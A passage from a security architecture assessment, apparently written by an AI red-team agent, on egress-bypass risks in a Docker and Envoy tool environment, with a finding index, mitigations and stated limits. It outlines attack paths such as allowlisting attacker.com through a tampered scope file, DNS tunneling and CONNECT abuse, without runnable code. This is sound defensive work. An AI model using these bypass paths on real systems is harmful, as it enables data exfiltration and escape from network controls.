2. The modified SCOPE.md adds `attacker.com` to `authorized_targets`.
3. The orchestrator's next Envoy allowlist generation run reads SCOPE.md and generates an Envoy config that includes attacker.com.
4. Envoy reloads its config (either scheduled reload or triggered via admin API if accessible).
5. Tool container can now reach attacker.com through Envoy, producing proxy log entries that appear legitimate.

**Severity:** HIGH in target state.
**ATT&CK chain:** T1565.001 (Stored Data Manipulation) -> T1090 (Proxy).
**Mitigated by:** Read-only SCOPE.md mount + file integrity verification before config generation.

---

## Prioritized Finding Index

| Priority | Vector | ID | Severity | Exploitability | Current State | Target State |
|----------|--------|----|----------|---------------|---------------|--------------|
| 1 | No network isolation on recon/cloud/exploit networks | V4/V2 | CRITICAL | IMMEDIATE | Not Prevented | N/A (precursor) |
| 2 | DNS Tunneling | V1 | HIGH | HIGH | Not Prevented | Not Prevented |
| 3 | Envoy Admin Interface Exposure | V10 | HIGH | HIGH | N/A | Not Prevented (design gap) |
| 4 | CONNECT Method Abuse | V3 | HIGH | HIGH | N/A | Conditional |
| 5 | Envoy Config Volume Manipulation | V6 | HIGH | MEDIUM | N/A | Conditional |
| 6 | East-West Container Movement | V9 | MEDIUM | MEDIUM | Not Prevented | Not Prevented |
| 7 | Shared Volume Side-Channel | V7 | MEDIUM | MEDIUM | Not Prevented | Partially Prevented |
| 8 | Docker Network Escape | V5 | MEDIUM | LOW | Partially Prevented | Partially Prevented |
| 9 | IPv6 Bypass | V8 | LOW | LOW | Conditional | Conditional |
| 10 | Raw TCP Bypass | V2 | LOW | LOW (target state) | CRITICAL (current) | Prevented |

---

## Mitigation Map to FEAT-W13

| Mitigation | Priority | Vectors Addressed | Engineering Task |
|------------|----------|-------------------|-----------------|
| Add `internal: true` to recon-net, cloud-net, exploit-net | IMMEDIATE | V2, V4 | Add three lines to docker-compose.yml files before any other hardening |
| Bind Envoy admin to 127.0.0.1 | HIGH | V10 | Configure `admin.address.socket_address.address: 127.0.0.1` in envoy.yaml |
| Deploy DNS filtering proxy | HIGH | V1 | Add Pi-hole or Unbound container to each internal network; set `dns:` in tool containers |
| Disable or restrict CONNECT method | HIGH | V3 | Set `allow_connect: false` in Envoy HTTP connection manager, or restrict to specific host:port pairs |
| Envoy config on separate non-shared volume | HIGH | V6 | Create `envoy-config` named volume; do NOT share with tool containers |
| Mount SCOPE.md read-only in tool containers | HIGH | V7, V6 | Add `read_only: true` to SCOPE.md bind mount |
| Per-container /work subdirectory isolation | MEDIUM | V7, V9 | Refactor volume mounts from `/work` to `/work/<domain>/` per container |
| Remove test-runner dual-network attachment | MEDIUM | V9 | Evaluate whether test-runner truly needs both rainbow-net and blue-net |
| Disable IPv6 explicitly | MEDIUM | V8 | Add `enable_ipv6: false` to all network definitions |
| Add `cap_drop: ALL` to exploit containers | MEDIUM | V5 | Add capabilities section to exploit service definitions |
| Audit Metasploit 6.4 image capabilities | MEDIUM | V5 | Inspect image for running user and default capabilities |
| File integrity monitoring on SCOPE.md | MEDIUM | V7, V6 | SHA-256 verification in the Envoy config generator before each run |
| Seccomp profiles for tool containers | LOW | V5 | Apply Docker default seccomp or custom profile |
| Neo4j credential rotation | LOW | V9 | Replace `test-only-not-real` with a randomly generated value |

---

## Analysis Limitations

The following gaps exist in this assessment due to the architecture analysis scope (no live tooling executed):

| Gap | Marker | Impact |
|-----|--------|--------|
| DNS tunneling not empirically tested | UNVALIDATED | Feasibility confirmed by Docker architecture documentation; actual test would require running a container and observing DNS forwarding behavior through `internal: true` network |
| Envoy not deployed | UNVALIDATED | All Envoy-specific vectors (V3, V6, V10) assessed against the documented target-state design; actual Envoy config validation not possible |
| IPv6 host configuration unknown | UNVALIDATED | macOS Docker Desktop behavior documented; production Linux host IPv6 config is unknown |
| Metasploit 6.4 image capabilities | UNVALIDATED | The `metasploitframework/metasploit-framework:6.4.0` image was not inspected at runtime; capability set is documented by Metasploit project but not verified against this specific version |
| CONNECT abuse requires Envoy config | UNVALIDATED | Attack feasibility depends on specific Envoy CONNECT configuration in FEAT-W13; not yet specified |
| Phase 6 iptables ACLs not described | GAP | The design references "Phase 6" iptables ACLs for egress control but no implementation details are available for assessment |

All HIGH/CRITICAL findings are based on documented Docker and Envoy behavior from authoritative sources, not LLM training data assumptions. Manual verification commands have been included per finding where applicable.

---

*Output persisted per P-002.*
*Evidence-based per P-001: all claims grounded in actual Docker Compose file analysis and documented Docker/Envoy behavior.*
*Analysis scope: architecture review only; no exploitation attempted (authorization level: read-only).*
*Agent: red-vuln v1.0.0*
*Engagement: RED-W13-001*
*Date: 2026-03-18*
